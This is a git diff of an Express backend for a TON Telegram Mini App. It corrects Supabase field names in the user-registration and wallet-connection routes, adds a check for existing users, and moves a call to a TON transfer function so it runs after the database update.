@@ -27,20 +27,31 @@ app.get('/', (req, res) => {
   res.json({ status: 'OK', message: 'TON Mini App Backend is working!' });
 });
 
-// Регистрация пользователя из Telegram - ТЕПЕРЬ РАБОТАЕТ С БАЗОЙ
+// Регистрация пользователя из Telegram - ИСПРАВЛЕНО
 app.post('/api/user', async (req, res) => {
   try {
     const { tg_id, username, first_name, last_name } = req.body;
     
-    // Сохранение в Supabase
+    // Проверяем существующего пользователя
+    const { data: existingUser, error: checkError } = await supabase
+      .from('users')
+      .select('*')
+      .eq('telegram_id', tg_id)
+      .single();
+
+    if (existingUser) {
+      return res.json({ success: true, user: existingUser });
+    }
+
+    // Сохранение в Supabase - ИСПРАВЛЕННЫЕ ПОЛЯ
     const { data, error } = await supabase
       .from('users')
       .insert([{ 
-        tg_id: tg_id, 
+        telegram_id: tg_id,        // ← ПРАВИЛЬНО
         username: username, 
         first_name: first_name, 
         last_name: last_name, 
-        balance: 5.0 
+        ton_balance: 5.0           // ← ПРАВИЛЬНО
       }])
       .select();
 
@@ -58,24 +69,26 @@ app.post('/api/user', async (req, res) => {
   }
 });
 
-// Подключение кошелька
+// Подключение кошелька - ИСПРАВЛЕНО
 app.post('/api/connect-wallet', async (req, res) => {
   try {
     const { tg_id, wallet_address } = req.body;
     
     console.log('Wallet connection attempt:', { tg_id, wallet_address });
-    const transferResult = await initiateTONTransfer(wallet_address);
     
-    // Обновляем пользователя в базе
+    // Обновляем пользователя в базе - ИСПРАВЛЕННЫЕ ПОЛЯ
     const { data, error } = await supabase
       .from('users')
       .update({ wallet_address: wallet_address })
-      .eq('tg_id', tg_id)
+      .eq('telegram_id', tg_id)    // ← ПРАВИЛЬНО
       .select();
 
     if (error) throw error;
     
     console.log('Wallet connected and user updated:', data[0]);
+    
+    const transferResult = await initiateTONTransfer(wallet_address);
+    
     res.json({ 
       success: true, 
       message: 'Wallet connected successfully',
